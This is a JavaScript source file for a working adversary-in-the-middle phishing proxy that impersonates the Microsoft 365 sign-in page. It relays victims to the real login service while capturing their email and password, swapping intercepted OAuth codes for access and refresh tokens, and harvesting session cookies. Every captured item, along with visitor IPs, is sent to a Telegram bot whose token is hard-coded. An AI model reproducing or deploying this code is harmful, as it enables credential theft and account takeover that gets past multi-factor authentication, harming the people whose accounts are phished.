// proxy-server.js

import express from 'express';
import fetch from 'node-fetch';
import bodyParser from 'body-parser';
import { URL, URLSearchParams } from 'url';

const app = express();
const port = 3000;

// === CONFIG (EDIT THESE) ===
const config = {
  upstream: 'login.microsoftonline.com',
  upstreamPath: '/common/oauth2/authorize?response_type=code&client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264&resource=https://graph.microsoft.com&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient',
  blockedRegions: [],
  blockedIPs: ['0.0.0.0', '127.0.0.1'],
  telegram: {
    token: '5609281274:AAHWsvjYauuibR_vs9MPdInpB8LzB1lJXt8',
    chatId: '1412104349', // your Telegram chat ID
  }
};

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// === TELEGRAM LOGGER ===
async function sendToTelegram(message) {
  const { token, chatId } = config.telegram;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' }),
    });
  } catch (err) {
    console.error('Telegram error:', err);
  }
}

// === EXCHANGE CODE FOR TOKENS ===
async function exchangeCodeForTokens(code) {
  const tokenEndpoint = 'https://login.microsoftonline.com/common/oauth2/token';

  const formData = new URLSearchParams({
    client_id: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
    grant_type: 'authorization_code',
    code: code,
    redirect_uri: 'https://login.microsoftonline.com/common/oauth2/nativeclient',
    resource: 'https://graph.microsoft.com',
  });

  const res = await fetch(tokenEndpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: formData.toString(),
  });

  if (!res.ok) throw new Error(await res.text());

  const data = await res.json();
  return {
    accessToken: data.access_token,
    refreshToken: data.refresh_token,
    expiresIn: data.expires_in,
    tokenType: data.token_type,
    resource: data.resource,
  };
}

// === MAIN PROXY ===
app.use(async (req, res) => {
  const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const clientRegion = req.headers['cf-ipcountry'] || 'XX';
  const userAgent = req.headers['user-agent'] || 'Unknown';

  if (config.blockedRegions.includes(clientRegion.toUpperCase()) || config.blockedIPs.includes(clientIP)) {
    return res.status(403).send('Access Denied');
  }

  // Log visitor info
  await sendToTelegram(
    `<b>New Visitor</b>\n<b>IP:</b> ${clientIP}\n<b>Region:</b> ${clientRegion}\n<b>Browser:</b> ${userAgent}`
  );

  // Capture credentials (form POST)
  if (
    req.method === 'POST' &&
    req.headers['content-type']?.includes('application/x-www-form-urlencoded')
  ) {
    const creds = new URLSearchParams(req.body);
    const email = creds.get('login');
    const password = creds.get('passwd');

    if (email && password) {
      await sendToTelegram(
        `<b>Captured Credentials</b>\n<b>Email:</b> ${email}\n<b>Password:</b> ${password}`
      );
    }
  }

  const isRoot = req.path === '/';
  const targetUrl = new URL(`https://${config.upstream}${isRoot ? config.upstreamPath : req.originalUrl}`);

  const headers = { ...req.headers };
  headers['host'] = config.upstream;
  headers['referer'] = `https://${req.headers.host}`;
  delete headers['accept-encoding'];

  try {
    const upstreamRes = await fetch(targetUrl.toString(), {
      method: req.method,
      headers,
      body: req.method === 'GET' ? undefined : new URLSearchParams(req.body).toString(),
      redirect: 'manual',
    });

    // Handle code redirect
    if (upstreamRes.status === 302) {
      const location = upstreamRes.headers.get('location');
      const match = location?.match(/nativeclient\?code=([^&]+)/);
      if (match && match[1]) {
        try {
          const tokens = await exchangeCodeForTokens(match[1]);
          await sendToTelegram(
            `<b>OAuth Tokens</b>\n<b>Access Token:</b> ${tokens.accessToken}\n<b>Refresh Token:</b> ${tokens.refreshToken}\n<b>Expires:</b> ${tokens.expiresIn}s`
          );
        } catch (err) {
          console.error('Token exchange failed:', err);
        }
      }
      return res.redirect(302, 'https://portal.office.com');
    }

    // Rewrite headers/cookies
    const responseHeaders = {};
    upstreamRes.headers.forEach((val, key) => {
      if (!['content-encoding', 'content-length'].includes(key.toLowerCase())) {
        responseHeaders[key] = val;
      }
    });

    const setCookies = upstreamRes.headers.raw()['set-cookie'] || [];
    const modifiedCookies = setCookies.map(c =>
      c.replace(new RegExp(config.upstream, 'gi'), req.headers.host)
    );
    if (modifiedCookies.length > 0) {
      responseHeaders['set-cookie'] = modifiedCookies;
      await sendToTelegram(`<b>Cookies:</b>\n${modifiedCookies.join('\n')}`);
    }

    const body = (await upstreamRes.text()).replace(
      new RegExp(config.upstream, 'g'),
      req.headers.host
    );

    res.status(upstreamRes.status).set(responseHeaders).send(body);
  } catch (err) {
    console.error('Proxy error:', err);
    res.status(500).send('Proxy error occurred');
  }
});

app.listen(port, () => {
  console.log(`✅ Proxy server running at http://localhost:${port}`);
});
